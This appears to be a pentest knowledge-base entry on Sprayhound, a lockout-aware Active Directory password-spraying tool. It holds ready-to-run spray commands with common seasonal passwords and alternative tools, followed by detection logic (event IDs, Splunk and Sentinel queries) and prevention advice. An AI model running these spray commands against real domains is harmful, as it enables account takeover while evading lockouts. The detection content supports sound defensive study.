name: Sprayhound - Password Spray with BloodHound Marking
description: Sprayhound performs domain password spraying while respecting the account lockout policy (auto-fetches badPwdCount before each attempt to avoid locking users). On a successful spray it can mark owned users as owned directly in a BloodHound neo4j database, immediately updating attack paths. Combines safe spraying with graph enrichment.
notes:
=== SAFE SPRAY (lockout-aware) ===
  sprayhound -U users.txt -d <domain> -dc <dc_ip> -p Spring2024!
  # Reads badPwdCount per user, skips anyone near the lockout threshold

=== SPRAY + MARK OWNED IN BLOODHOUND ===
  sprayhound -U users.txt -d <domain> -dc <dc_ip> -p Spring2024! \
    -nh <neo4j_host> -nu neo4j -np bloodhound
  # Owned users are flagged owned=true in the graph

=== LOW-AND-SLOW SINGLE PASSWORD ===
  sprayhound -U users.txt -d <domain> -dc <dc_ip> -p Welcome1

=== GET LOCKOUT THRESHOLD FIRST ===
  crackmapexec smb <dc_ip> -u <user> -p <password> --pass-pol
  # Keep attempts below (threshold - 1); sprayhound enforces this automatically

=== ALTERNATIVES ===
  kerbrute passwordspray  # Kerberos pre-auth, no lockout count check
  crackmapexec smb --no-bruteforce  # manual spray
  DomainPasswordSpray.ps1  # on-host Windows spray

examples.label: Spray and mark owned in BloodHound
examples.command: sprayhound -U users.txt -d corp.local -dc 10.10.10.5 -p Spring2024! -nh 127.0.0.1 -nu neo4j -np bloodhound

recommended.note: Kerbrute sprays via Kerberos pre-auth (no SMB lockout visibility).
BloodHound consumes the owned markings to recompute paths.
CrackMapExec is the manual spray alternative.

defense.why_it_works: A single common password tried against many accounts stays under per-account lockout thresholds. Sprayhound reads badPwdCount via LDAP to avoid locking accounts, making the spray stealthier.
defense.prerequisites: Valid low-priv domain account (to read badPwdCount); network access to the DC; a user list.
defense.impact: Account compromise without triggering lockouts; immediate BloodHound path enrichment.
defense.detection: [MITRE T1110.003] Many 4625 failed logons across distinct accounts from one source in a short window; LDAP reads of badPwdCount across many users; 4771 Kerberos pre-auth failures.
defense.artifacts: Spike in 4625/4768/4771 events with the same source IP and varying TargetUserName; LDAP queries enumerating badPwdCount.
defense.splunk_spl:
index=windows EventCode=4625
| bin _time span=10m
| stats dc(TargetUserName) as users count by _time, IpAddress
| where users > 10
defense.sentinel_kql:
SecurityEvent
| where EventID == 4625
| summarize Accounts=dcount(TargetUserName), Attempts=count() by IpAddress, bin(TimeGenerated, 10m)
| where Accounts > 10
defense.prevention: Enforce account lockout policy; require MFA; deploy smart lockout (Entra); monitor badPwdCount reads; ban common/seasonal passwords.

detections.name: Password spraying - many accounts from single source
detections.logic:
index=windows EventCode=4625
| bin _time span=10m
| stats dc(TargetUserName) as unique_users values(TargetUserName) as users by _time, IpAddress
| where unique_users > 10
detections.false_positives: Vulnerability scanners, misconfigured service accounts, login portals
detections.tuning: Baseline normal 4625 volume per source; exclude known scanners
